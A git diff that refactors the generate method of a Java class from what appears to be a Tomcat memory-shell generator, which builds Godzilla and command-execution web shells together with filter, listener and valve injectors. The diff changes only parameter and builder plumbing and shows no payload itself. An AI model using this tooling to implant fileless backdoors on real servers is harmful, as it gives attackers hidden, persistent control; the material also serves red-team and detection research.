@@ -13,7 +13,6 @@ import com.reajason.javaweb.memsell.tomcat.godzilla.GodzillaValve;
 import com.reajason.javaweb.memsell.tomcat.injector.TomcatFilterInjector;
 import com.reajason.javaweb.memsell.tomcat.injector.TomcatListenerInjector;
 import com.reajason.javaweb.memsell.tomcat.injector.TomcatValveInjector;
-import lombok.SneakyThrows;
 import org.apache.commons.lang3.tuple.Pair;
 
 import java.util.HashMap;
@@ -66,55 +65,48 @@ public class TomcatShell {
         COMMAND_SHELL_MAP.put(JAKARTA_VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class));
     }
 
-    @SneakyThrows
-    public static GenerateResult generate(ShellTool shellTool, String shellType, ShellConfig shellConfig, int targetJdkVersion) {
-        if (shellTool == null || shellType == null || shellConfig == null) {
-            throw new IllegalArgumentException("Invalid arguments: shellTool, shellType, and shellConfig cannot be null.");
-        }
-        Pair<Class<?>, Class<?>> classPair;
+    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
+        Class<?> injectorClass = injectorConfig.getInjectorClass();
         byte[] shellBytes;
-        boolean useJakarta = shellType.startsWith(JAKARTA);
-        switch (shellTool) {
+        switch (shellConfig.getShellTool()) {
             case Godzilla: {
-                classPair = GODZILLA_SHELL_MAP.get(shellType);
-                GodzillaShellConfig godzillaConfig = (GodzillaShellConfig) shellConfig;
-                shellBytes = GodzillaGenerator.generate(classPair.getLeft(),
-                        godzillaConfig.getShellClassName(),
-                        godzillaConfig.getPass(),
-                        godzillaConfig.getKey(),
-                        godzillaConfig.getHeaderName(),
-                        godzillaConfig.getHeaderValue(),
-                        useJakarta,
-                        targetJdkVersion
-                );
+                Pair<Class<?>, Class<?>> classPair = GODZILLA_SHELL_MAP.get(shellConfig.getShellType());
+                if (injectorClass == null) {
+                    injectorClass = classPair.getRight();
+                }
+                shellToolConfig.setClazz(classPair.getLeft());
+                shellBytes = GodzillaGenerator.generate(shellConfig, (GodzillaConfig) shellToolConfig);
                 break;
             }
             case Command: {
-                classPair = COMMAND_SHELL_MAP.get(shellType);
-                CommandShellConfig commandConfig = (CommandShellConfig) shellConfig;
-                shellBytes = CommandGenerator.generate(classPair.getLeft(),
-                        commandConfig.getShellClassName(),
-                        commandConfig.getParamName(), useJakarta, targetJdkVersion);
+                Pair<Class<?>, Class<?>> classPair = COMMAND_SHELL_MAP.get(shellConfig.getShellType());
+                if (injectorClass == null) {
+                    injectorClass = classPair.getRight();
+                }
+                shellToolConfig.setClazz(classPair.getLeft());
+                shellBytes = CommandGenerator.generate(shellConfig, (CommandConfig) shellToolConfig);
                 break;
             }
             default:
-                throw new UnsupportedOperationException("Unknown shell tool: " + shellTool);
+                throw new UnsupportedOperationException("Unknown shell tool: " + shellConfig.getShellTool());
         }
 
-        Class<?> injectorClass = classPair.getRight();
-        byte[] injectorBytes = InjectorGenerator.generate(injectorClass,
-                shellConfig.getInjectorClassName(),
-                shellConfig.getShellClassName(),
-                shellBytes,
-                shellConfig.getUrlPattern(),
-                targetJdkVersion);
+        injectorConfig = injectorConfig
+                .toBuilder()
+                .injectorClass(injectorClass)
+                .shellClassName(shellToolConfig.getClassName())
+                .shellClassBytes(shellBytes).build();
+
+        byte[] injectorBytes = InjectorGenerator.generate(shellConfig, injectorConfig);
 
         return GenerateResult.builder()
-                .shellClassName(shellConfig.getShellClassName())
-                .shellBytes(shellBytes)
-                .injectorClassName(shellConfig.getInjectorClassName())
-                .injectorBytes(injectorBytes)
                 .shellConfig(shellConfig)
-                .build().encodeBase64();
+                .shellToolConfig(shellToolConfig)
+                .injectorConfig(injectorConfig)
+                .shellClassName(shellToolConfig.getClassName())
+                .shellBytes(shellBytes)
+                .injectorClassName(injectorClass.getName())
+                .injectorBytes(injectorBytes)
+                .build();
     }
 }
